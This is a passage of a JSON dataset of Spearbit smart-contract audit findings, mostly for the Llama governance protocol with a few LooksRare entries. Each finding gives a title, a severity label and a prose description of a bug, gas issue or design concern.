        "title": "Strategies with faulty price feeds can have unwanted consequences",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In LooksRare protocol once a strategy has been added its implementation and selector cannot be updated. This is a good since users who sign their MakerBid or MakerAsk can trustlessly examine the strategy implementation before including them into their orders. Some strategies might depend on other actors such as price feeds. This is the case for StrategyUSDDynamicAsk and StrategyFloorFromChainlink. If for some reason these price feeds do not return the correct prices, these strategies can have a slight deviation from their original intent. Case StrategyUSDDynamicAsk If the price feed returns a lower price, a taker can bid on an order with that lower price. This scenario is guarded by MakerAsk's minimum price. But the maker would not receive the expected amount if the correct price was reported and was greater than the maker's minimum ask. Case StrategyFloorFromChainlink For executeFixedDiscountCollectionOfferStrategyWithTakerAsk and executeBasisPointsDiscountCollec- tionOfferStrategyWithTakerAsk if the price feeds reports a floor price higher than the maker's maximum bid price, the taker can match with the maximum bid. Thus the maker ends up paying more than the actual floor adjusted by the discount formula. For executeFixedPremiumStrategyWithTakerBid and executeBasisPointsPremiumStrategyWithTakerBid if the price feeds report a floor price lower than the maker's minimum ask price, the taker can match with the minimum ask price and pay less than the actual floor price (adjusted by the premium).",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "The provided price to IERC2981.royaltyInfo does not match the specifications",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "royaltyFeeRegistry.royaltyInfo does not return a non-zero creator address, we check whether the collection supports IERC2981 and if it does, we loop over each itemId and call the collection's royaltyInfo endpoint. But the input price parameters provided to this endpoint do not match the specification of EIP-2981: CreatorFeeManagerWithRoyalties, CreatorFeeManagerWithRebates and /// @param _salePrice - the sale price of the NFT asset specified by _tokenId 78 The price provided in viewCreatorFeeInfo functions, is the price for the whole batch of itemIds and not the individual tokens itemIds[i] provided to the royaltyInfo endpoint. Even if the return values (newCreator, newCreatorFee) would all match, it would not mean that newCreatorFee should be used as the royalty for the whole batch. An example is that if the royalty is not percentage-based, but a fixed price.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace the abi.encodeWithSelector with abi.encodeCall to ensure type and typo safety",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "In the context above, abi.encodeWithSelector is used to create the call data for a call to an external contract. This function does not guarantee that mismatched types are used for the input parameters.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use the inline keccak256 with the formatting suggested when defining a named constant for an EIP-712 type hash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LooksRare-Spearbit-Security-Review.pdf",
        "body": "Hardcoded byte32 EIP-712 type hashes are defined in the OrderStructs library.",
        "labels": [
            "Spearbit",
            "LooksRare",
            "Severity: Informational"
        ]
    },
    {
        "title": "The castApprovalBySig and castDisapprovalBySig functions can revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The castApprovalBySig and castDisapprovalBySig functions are used to cast an approve or disapprove via an off-chain signature. Within the _preCastAssertions a check is performed against the strategy using msg.sender instead of policy- holder, the strategy (e.g. AbsoluteStrategy) uses that argument to check if the cast sender is a policyholder. isApproval ? actionInfo.strategy.isApprovalEnabled(actionInfo, msg.sender) : actionInfo.strategy.isDisapprovalEnabled(actionInfo, msg.sender); While this works for normal cast, using the ones with signatures will fail as the sender can be anyone who calls the method with the signature signed off-chain.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "The castApproval/castDisapproval doesn't check if role parameter is the approvalRole",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "A policyholder should be able to cast their approval for an action if they have the approvalRole defined in the strategy. It should not be possible for other roles to cast an action. The _castApproval method verifies if the policyholder has the role passed as an argument but doesn't check if it actually has approvalRole which is eligible to cast an approval. This means any role in the llama contract can participate in the approval with completely different quantities (weights). The same problem occurs for the castDisapproval function as well.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Reducing the quantity of a policyholder results in an increase instead of a decrease in totalQuan- tity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "In Llama policyholder can approve or disapprove actions. Each policyholder has a quantity which represents their approval casting power. It is possible to update the quantity of individual policyholder with the setRoleHolder function in the LlamaPolicy. The _setRoleHolder method is not handling the decrease of quantity correctly for the totalQuantity. The totalQuantity describes the sum of the quantities of the individual policyholders for a specific role. In the case of a quantity change, the difference is calculated as follows: uint128 quantityDiff = initialQuantity > quantity ? initialQuantity - quantity : quantity - ,! initialQuantity; However, the quantityDiff is always added instead of being subtracted when the quantity is reduced. This results in an incorrect tracking of the totalQuantity. Adding the quantityDiff should only happen in the increase case. See: LlamaPolicy.sol#L388 // case: willHaveRole=true, hadRoleQuantity=true newTotalQuantity = currentRoleSupply.totalQuantity + quantityDiff;",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: High Risk"
        ]
    },
    {
        "title": "LlamaPolicy.revokePolicy cannot be called repeatedly and may result in burned tokens retaining active roles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama has two distinct revokePolicy functions. The first revokePolicy function removes all roles of a policyholder and burns the associated token. This function iterates over all existing roles, regardless of whether a policyholder still holds the role. In the next step the token is burned. If the total number of roles becomes too high, this transaction might not fit into one block. A second version of the revokePolicy function allows users to pass an array of roles to be removed. This approach should enable the function to be called multiple times, thus avoiding an \"out-of-gas\" error. An out-of-gas error is currently not very likely considering the maximum possible role number of 255. However, the method exists and could be called with a subset of the roles a policyholder. The method contains the following check: if (balanceOf(policyholder) == 0) revert AddressDoesNotHoldPolicy(policyholder); Therefore, it is not possible to call the method multiple times. The result of a call with a subset of roles would lead to an inconsistent state. The token of the policyholder is burned, but the policyholder could still use the remaining roles in Llama. Important methods like LlamaPolicy.hasRole don't check if LlamaPolicy.sol#L250) the token has been burned. (See",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Role, permission, strategy, and guard management or config errors may prevent creating/approving/queuing/executing actions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "LlamaCore deployment from the factory will only succeed if one of the roles is the BOOTSTRAP_ROLE. As the comments note: // There must be at least one role holder with role ID of 1, since that role ID is initially // given permission to call `setRolePermission`. This is required to reduce the chance that an // instance is deployed with an invalid configuration that results in the instance being unusable. // Role ID 1 is referred to as the bootstrap role. There are still several ways a user can misstep and lose access to LlamaCore.  Bootstrap Role Scenarios While the bootstrap role is still needed: 1. Setting an expiry on the bootstrap role's policyholder RoleHolderData and allowing the timestamp to pass. Once passed any caller may remove the BOOTSTRAP_ROLE from expired policyholders. 2. Removing the BOOTSTRAP_ROLE from all policyholders. 3. Revoking the role's permission with setRolePermission(BOOTSTRAP_ROLE, bootstrapPermissionId, false).  General Roles and Permissions Similarly, users may allow other permissions to expire, or remove/revoke them, which can leave the contract in a state where no permissions exist to interact with it. The BOOTSTRAP_- ROLE would need to be revoked or otherwise out of use for this to be a problem.  Misconfigured Strategies A misconfigured strategy may also result in the inability to process new actions. For example: 1. Setting minApprovals too high. 2. Setting queuingPeriod unreasonably high 3. Calling revokePolicy when doing so would make policy.getRoleSupplyAsQuantitySum(approvalRole) fall below minApprovals (or fall below minApprovals - actionCreatorApprovalRoleQty). 1 & 2 but applied to disapprovals. And more, depending on the strategy (e.g. if a strategy always responded true to isActive).  Removal of Strategies It should not be possible to remove the last strategy of a Llama instance It is possible to remove all strategies from an Ilama instance. It would not be possible to create a new action afterward. An action is required to add other strategies back. As a result, the instance would become unusable, and access to funds locked in the Accounts would be lost.  Misconfigured Guards An accidentally overly aggressive guard could block all transactions. There is a built-in protection to prevent guards from getting in the way of basic management if (target == address(this) || target == address(policy)) revert CannotUseCoreOrPolicy();. Again, the BOOTSTRAP_ROLE would need to be revoked or otherwise out of use for this to be a problem.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaPolicy.hasRole doesn't check if a policyholder holds a token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Incorrect usage of the revokePolicy function can result in a case, where the token of a policyholder is already burned but still holds a role. The hasRole function doesn't check if in addition to the role the policyholder still holds the token to be active. The role could still be used in the Llama system.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Incorrect isActionApproved behavior if new policyholders get added after the createAction in the same block.timestamp",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama utilizes Checkpoints to store approval quantities per timestamp. If the current quantity changes, the previous values are preserved. The block.timestamp of createAction is used as a snapshot for the approval. (See: LlamaCore.sol#L597) Thus, in addition to the Checkpoints, the totalQuantity or numberOfHolders at the createAction are included in the snapshot. However, if new policyholders are added or their quantities change after the createAction within the same block.timestamp, they are not considered in the snapshot but remain eligible to cast an approval. For example, if there are four policyholders together 50% minimum approval: If a new action is created and two policyholders are added subsequently within the same block.timestamp. 9 The numberOfHolders would be 4 in the snapshot instead of 6. All 6 policyholders could participate in the approval, and two approvals would be sufficient instead of 4. Adding new policyholders together with creating a new action could happen easily in a llama script, which allows to bundle different actions. If a separate action is used to add a new policyholder, the final execution happens via a public callable function. An attacker could exploit this by trying to execute the add new policyholder action if a new action is created",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaCore delegate calls can bring Llama into an unusable state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The core contract in Llama allows the execution of actions through a delegate_call. An action is executed as a delegate_call when the target is added as an authorizedScript. This enables batching multiple tasks into a contract, which can be executed as a single action. In the delegate_call, a script contract could modify arbitrary any slot of the core contract. The Llama team is aware of this fact and has added additional safety-checks to see if the slot0 has been modified by the delegate_call. The slot0 contains values that should never be allowed to change. bytes32 originalStorage = _readSlot0(); (success, result) = actionInfo.target.delegatecall(actionInfo.data); if (originalStorage != _readSlot0()) revert Slot0Changed(); A script might be intended to modify certain storage slots. However, incorrect SSTORE operations can completely break the contracts. For example, setting actionsCount = type(uint).max would prevent creating any new actions, and access to funds stored in the Account would be lost.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The execution opcode of an action can be changed from call to delegate_call after approval",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "In Llama an action only defines the target address and the function which should be called. An action doesn't implicitly define if the opcode should be a call or a delegate_call. This only depends on whether the target address is added to authorizedScripts mapping. However, adding a target to the authorizedScripts can be done after the approval in a different action. The authorizedScript action could use a different set of signers with a different approval strategy. The change of adding a target to authorizedScript should not impact actions which are already approved and in the queuing state. This could lead to security issues when policyholders approved the action under the assumption the opcode will be a call instead of a delegate call.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "LlamaFactory is governed by Llama itself",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama uses their own governance system to govern the LlamaFactory contract. The LlamaFactory contract is responsible for authorizing new LlamaStrategies. We can identify several potential drawbacks with this approach. If only a single strategy contract is used and a critical bug is discovered, the implications could be significant. In such a scenario, it would mean a broken strategy contract needs to be used by the Factory governance to deploy a fixed version of the strategy contract or enable other strategies. The likelihood for this to happen is still low but implications could be critical.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The permissionId doesn't include call or delegate-call for LlamaAccount.execute",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The decision if LlamaAccount.execute is a delegate_call depends on the bool flag parameter withDelegatecall. This parameter is not included in the permissionId, which controls role permissions in Llama. The permissionId in Llama is calculated in the following way: PermissionData memory permission = PermissionData(target, bytes4(data), strategy); bytes32 permissionId = keccak256(abi.encode(permission)); The permissionId required for a role to perform an action only includes the function signature but not the param- eters themselves. It is impossible to define the opcode as part of the permissionId.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Nonconforming EIP-712 typehash",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Incorrect strings used in computing the EIP-712 typehash. 1. The strings contain space( ) after comma(,) which is not standard EIP-712 behaviour. 2. ActionInfo is not used in typehash. There will be a mismatch when comparing to hashes produced by JS libs or solidity (if implemented), etc.. Not adhering to EIP-712 spec means wallets will not render correctly and any supporting tools will produce a different typehash.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Various events do not add the role as parameter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Note: During the audit, the client discovered an issue that affects their offchain infrastructure. Various events do not emit the role as parameter: 1. event ActionCreated(uint256 id, address indexed creator, ILlamaStrategy indexed strategy, address indexed target, uint256 value, bytes data, string description); 2. event ApprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason); 3. event DisapprovalCast(uint256 id, address indexed policyholder, uint256 quantity, string reason);",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaCore doesn't check if minExecutionTime returned by strategy is in the past",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The minExecutionTime returned by a strategy is not validated.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Address parsing from tokenId to address string does not account for leading 0s",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Policy tokenIds are derived from the holder's account address. The address is intended to be displayed in the svg generated when calling tokenURI. Currently, leading 0s are truncated rendering the incorrect address string: e.g. 0x015b... vs 0x0000...be60 for address 0x0000000000015B23C7e20b0eA5eBd84c39dCbE60.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The ALL_HOLDERS_ROLE can be set as a force role by mistake",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "During the initialization, an array of roles that must be assigned as force approval/disapproval can be sent. The logic does not account for ALL_HOLDERS_ROLE (which is role id 0, the default value of uint8) which can be sent as a mistake by the user. This is a low issue as if the above scenario happens, the strategy can become obsolete which will render the owner redeploy the strategy with correct initialization configs. We must mention that the force roles can not be changed after they are set within the initialization.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaPolicy.setRolePermission allows to set permissions for non existing roles",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "It is possible to set a permission for a role that doesn't exist, yet. In other functions like assigning a role to a policyholder, this check happens. (See: LlamaPolicy.sol#L343) A related issue, very close to this, is the updateRoleDescription method which can emit an event for a role that does not exists. This is just an informational issue as it does not affect with anything the on-chain logic, might affect off-chain logic if any logic will ever rely on it.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "During the audit, the client discovered an issue that affects their off-chain infrastructure. The RoleAssigned event in LlamaPolicy emits the currentRoleSupply instead of the quantity. From an off-chain perspective, there is currently no way to get the quantity assigned for a role to a policyholder at Role Assignment time. The event would be more useful if it emitted quantity instead of currentRoleSupply (since the latter can be just be calculated off-chain from the former).",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ETH can remain in the contract if msg.value is greater than expected",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When an action is created, the creator can specify an amount of ETH that needs to be sent when executing the transaction. This is necessary in order to forward ETH to a target call. Currently, when executing the action the msg.value is checked to be at least the required amount of ETH needed to be forwarded. if (msg.value < actionInfo.value) revert InsufficientMsgValue(); This can result in ETH remaining in the contract after the execution. From our point of view, LlamaCore should not hold any balance of ETH.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Cannot re-authorize an unauthorized strategy config",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Strategies are deployed using a create2 salt. The salt is derived from the strategy config itself (see LlamaCore.sol#L709-L710). This means that any unauthorized strategy cannot be used in the future, even if a user decides to re-enable it.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Signed messages may not be cancelled",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Creating, approving, and disapproving actions may all be done by signing a message and having another account call the relevant *BySig function. Currently, there is no way for a signed message to be revoked without a successful *BySig function call containing the nonce of the message to be revoked.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "LlamaCore name open to squatting or impersonation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When deploying a LlamaCore clone, the create2 salt is derived from the name. This means that no two may have the same name, and name squatting, or impersonation, may occur.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Expired policyholders are active until they are explicitly revoked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Each policyholder in Llama has an expiration timestamp. However, policyholder can still use the power of their role after the expiration has passed. The final revoke only happens after the public LlamaPolicy.revokeExpiredRole method is called. Anyone can call this method after the expiration timestamp is passed. For the Llama system to function effectively with role expiration, it is essential that external keepers vigilantly monitor the contract and promptly revoke expired roles. A final revoke exactly at the expiration can not be guaranteed.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gas optimizations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase we've identified gas improvements that were aggregated into one issue for a better management. RelativeStrategy.sol#L159  The if (disapprovalPolicySupply == 0) revert RoleHasZeroSupply(disapprovalRole); check and actionDisapprovalSupply[actionInfo.id] = disapprovalPolicySupply; can be wrapped in an if block in case disapprovals are enabled  The uint128 newNumberOfHolders; and uint128 newTotalQuantity; variables are obsolete as the up- dates on the currentRoleSupply can be done in the if branches. LlamaPolicy.sol#L380-L392  The exists check is redundant LlamaPolicy.sol#L252  The _validateActionInfoHash(action.infoHash, actionInfo); is redundant as it's already done in the getActionState LlamaCore.sol#L292 LlamaCore.sol#L280 LlamaCore.sol#L672  Finding the BOOTSTRAP_ROLE in the LlamaFactory._deploy could happen by expecting the role at a cer- tain position like position 0 instead of paying gas for an on-chain search operation to iterate the array. LlamaFactory.sol#L205  quantityDiff calculation guaranteed to not overflow as the ternary checks initialQuantity > quantity before subtracting.  Infeasible for numberOfHolders and totalQuantity to overflow. See also LlamaPolicy.sol#L422-L423  Infeasible for numberOfHolders to overflow.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Various parts of the code is unused or unnecessary.  CallReverted and MissingAdmin in LlamaPolicy.sol#L27-L29  DisapprovalThresholdNotMet in RelativeStrategy.sol#L28  Unused errors in LlamaCore.sol InvalidCancelation, ProhibitedByActionGuard, ProhibitedByStrategy, ProhibitedByStrategy(bytes32 reason) and RoleHasZeroSupply(uint8 role)  /// - Action creators are not allowed to cast approvals or disapprovals on their own actions, The comment is inaccurate, this strategy, the creators have no restrictions on their actions. RelativeStrategy.sol#L19 17",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicate storage reads and external calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "When creating, approving, disapproving, queuing, and executing actions, there are calls between the various contracts in the system. Due to the external calls, the compiler will not cache storage reads, meaning the gas cost of warm sloads is incurred multiple times. The same is true for view function calls between the contracts. A number of these calls are returning the same value multiple times in a transaction.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Consider clones-with-immutable-args",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The cloned contracts have immutable values that are written to storage on initialization due to proxies being used. Reading from storage costs extra gas but also puts some of the storage values at risk of being overwritten when making delegate calls.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "The domainSeperator may be cached",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The domainSeperator is computed for each use. Some gas may be saved by using caching and deferring to the cached value.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Prefer on-chain SVGs or IPFS links over server links for contractURI",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Llama uses on-chain SVG for LlamaPolicy.tokenURI. The same could be implemented for LlamaPolicy.contractURI as well. In general IPFS links or on-chain SVG for visual representations provide better properties than centralized server links.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider making the delegate-call scripts functions only callable by delegate-call",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "An additional safety check could be added to scripts if a function should be only callable via a delegate-call.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing tests for SingleUseScript.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "There are no tests for SingleUseScript.sol in Llama.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Role not available to Guards",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Use cases where Guards require knowing the creation or approval role for the action are not sup- ported. ActionInfo does reference the strategy, and the two implemented strategies do have public functions referencing the approvalRole, allowing for a workaround. However, this is not mandated by the ILlamaStrategy interface and is not guaranteed to be present in future strategies.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Global guards are not supported",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Other protocols use of guards applies them to the account (i.e. globally). In other words, if global guards existed and if there are some properties you know to apply to the entire LlamaCore instance a global guard could be applied. The current implementation allows granular control, but it also requires granular control with no ability to set global guards.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using _disableInitializers in constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "OpenZeppelin added the _disableInitializers() in 4.6.0 which prevents initialization of the im- plementation contract and recommends its use.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Revoking and setting a role edge cases",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "This issue highlights a number of edge-case behaviors 1. Calling setRoleHolder passing in an account with balanceOf == 0, 0 quantity, and 0 expiration results in minting the NFT. 2. Revoking all policies through revokeExpiredRole leaves an address with no roles except for the ALL_- HOLDERS_ROLE and a balanceOf == 1. 3. Revoking may be conducted on policies the address does not have (building on the previous scenario):  Alice is given role 1 with expiry.  Expiry passes.  Anyone calls revokeExpiredRole.  Role is revoked but Alice still has balanceOf == 1.  LlamaCore later calls revokePolicy with roles array of [2].  A role Alice never had is revoked.  The NFT is burned.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use built in string.concat",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The solidity version used has a built-in string.concat which can replace the instances of string(abi.encodePacked(...). The client notes there are no gas implications of this change while the change does offer semantic clarity.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistencies",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Throughout the codebase, we've encountered some inconsistencies that we decided to point out. for(uint256 i = 0... is not used everywhere e.g. AbsoluteStrategy.sol#L130  Sometimes, a returned value is not named. e.g. named return value function createAction( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, string memory description ) external returns (uint256 actionId) { unnamed return value function createActionBySig( uint8 role, ILlamaStrategy strategy, address target, uint256 value, bytes calldata data, address policyholder, uint8 v, bytes32 r, bytes32 s ) external returns (uint256) {  Missing NatSpec on various functions. e.g. LlamaPolicy.sol#L102  _uncheckedIncrement is not used everywhere.  Naming of modifiers In all contracts the onlyLlama modfiier only refers to the llamaCore. The only exception is LlamaPolicyMetadataParamRegistry which has the same name but refers to llamaCore and rootLlama but is called onlyLlama. See LlamaPolicyMetadataParamRegistry.sol#L16  Console.log debug output in RelativeStrategy console.log in RelativeStrategy See: RelativeStrat- egy.sol#L215  In GovernanceScript.sol both of SetRolePermission and SetRoleHolder mirror structs defined in the shared lib/Structs.sol file. Additionally, some contracts declare their own structs over inheriting all structs from lib/Structs.sol:  LlamaAccount  GovernanceScript  LlamaPolicy Recommend removing duplicate structs and, where relevant, continue making use of the shared Structs.sol for struct definitions.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Policyholders with large quantities may not both create and exercise their large quantity for the same action",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The AbsoluteStrategy removes the action creator from the set of policyholders who may approve / disapprove an action. This is a departure from how the RelativeStrategy handles action creators. Not permitting action creators to approve / disapprove is simple to reason about when each policyholder has a quantity of 1; creating can even be thought of an implicit approval and may be factored in when choosing a minApprovals value. However, in scenarios where a policyholder has a large quantity (in effect a large weight to their casted approval), creating an action means they forfeit the use of the vast majority of their quantity for that particular action.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "The roleBalanceCheckpoints can run out of gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "The roleBalanceCheckpoints function returns the Checkpoints history of a balance. This check will copy into memory the whole history which can end up in a out of gas error. This is an informational issue as this function was designed for off-chain usage and the caller can use eth_call with a higher gas limit.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "GovernanceScript.revokeExpiredRoles should be avoided in favor of calling LlamaPol- icy.revokeExpiredRole from EOA",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "GovernanceScript.revokeExpiredRoles is intended to be delagate called from LlamaCore. Given that LlamaPolicy.revokeExpiredRole is already public and without access controls, it will always be cheaper, and less complex, to call directly from an EOA or batching a multicall, again from an EOA.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "The InvalidActionState can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Currently, the InvalidActionState includes the expected state as an argument, this is unnecessary as you can derive the state from the method call, would make more sense to take the current state instead of the expected state.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "_uncheckedIncrement function written in multiple contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf",
        "body": "Multiple contracts make use of an _uncheckedIncrementfunction and each duplicates the function definition. Similarly the slot0 function appears in both LlamaAccount and LlamaCore and _toUint64 appears in the two strategy contracts plus LlamaCore.",
        "labels": [
            "Spearbit",
            "Llama",
            "Severity: Informational"
        ]
    },
    {
        "title": "Clones with malicious extradata are also considered valid clones",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Sudoswap-Spearbit-Security-Review.pdf",
